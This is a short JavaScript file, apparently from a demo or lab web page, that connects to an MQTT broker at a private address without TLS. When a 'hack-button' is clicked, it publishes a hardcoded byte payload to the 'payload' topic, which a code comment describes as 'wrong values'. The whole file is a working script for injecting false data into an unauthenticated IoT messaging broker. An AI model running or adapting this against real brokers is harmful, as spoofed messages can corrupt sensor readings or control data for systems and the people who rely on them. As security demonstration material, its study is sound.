var ip = "172.16.240.99";
var port = "9001";
var usessl = false;
var message, test;
var connected = false;

var id = (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);

var btn1 = document.getElementById('hack-button')

// Dumb function that fills a progress bar
function fillingProgressBar () {
  var elem = document.getElementById('progress-bar')
  var width = 1
  var id = setInterval(frame, 10)
  function frame () {
    if (width >= 100) {
      clearInterval(id)
    } else {
      width++
      elem.style.width = width + '%'
    }
  }
}


btn1.addEventListener('click', hackMQTTBroker, true); // i am not IE friendly

test = new Paho.MQTT.Client(ip, Number(port), id);

test.connect({
  useSSL: usessl,
  onSuccess: onConnect,
  reconnect: true
});

// see if mqtt is connected
function onConnect() {
  console.log("connected");
}


// function that publishes wrong values to the MQTT broker
function hackMQTTBroker() {

  var convertedValue = '';
  var payload = '0x00,0x00,0x01,0x42,0x78,0x00,0x00,0x42,0x7f,0x00,0x00';
  var inputArray = payload.split(",");
  for(var i=0;i<inputArray.length;i++)
  {
    var intVal = parseInt(inputArray[i],parseInt(16));
    if(Number.isNaN(intVal)) {
      CommonActions.showMessageToUser({message:'Invalid payload. Payload data should match Payload Type.'});
      return;
    }
    else 
    {
      convertedValue += String.fromCharCode(intVal);
    }
  }

  console.log(convertedValue + ' was clicked'); 
  var message = new Paho.MQTT.Message(convertedValue);
  message.destinationName = "payload";
  test.send(message);			
}
